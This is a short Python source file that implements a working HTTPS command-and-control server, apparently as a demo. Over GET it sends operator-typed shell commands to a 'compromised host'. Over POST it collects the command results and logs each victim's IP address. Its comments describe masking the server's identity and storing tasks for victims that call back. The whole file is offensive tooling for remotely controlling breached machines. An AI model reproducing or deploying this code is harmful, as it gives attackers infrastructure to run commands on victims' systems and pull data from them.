from http.server import *
import random, string, ssl

"""

this is used to generate random session cookie value.

"""

chars = string.ascii_letters + string.digits

session_value = ''.join(random.choice(chars) for i in range(20))

"""

c2server class has accepts two HTTP methods. 



1. GET : This method  is used to send command to the compromised host

2. POST : This method  is used to receive results of the command executed.

"""


class c2Server(BaseHTTPRequestHandler):

    def set_headers(self):
        """

        set_headers can be used to set custom HTTP headers. This helps mask identity of

        c2 server.

        """

        self.send_response(200, "ok")

        self.send_header('Content-type', 'text/html')

        self.send_header('Set-Cookie', session_value)

        self.end_headers()

    # Allow GET

    def do_GET(self):
        self.set_headers()

        """

        message variable is the command being sent to victim node. For the purpose of this 

        demo it is being entered manually. But it can be stored in a database and 

        retrieved later when victim calls back for task. A use case can be found in 

        https://github.com/madhavbhatt/Web-Based-Command-Control/blob/master/c2.py  

        """

        message = input("$ ")  # command

        self.wfile.write(message.encode('utf-8'))

    # Allow POST

    def do_POST(self):

        self.set_headers()
        print("data received")

        """

        self.client_address[0] is the IP address of calling victim. In the POST request, 

        host would send content-length of the data sent via POST. Which is further used 

        to isolate the data from request. 

        """

        print(self.client_address[0])

        content_length = int(self.headers['Content-Length'])

        post_data = self.rfile.read(content_length)

        data = post_data.decode('utf-8')  # result of command execution

        print(data)


def runC2server():
    server_address = ('', 443)

    httpd = HTTPServer(server_address, c2Server)

    httpd.socket = ssl.wrap_socket(httpd.socket, certfile='server.cert', keyfile="server.key", server_side=True)

    print("Server Started ..!!")

    httpd.serve_forever()


runC2server()
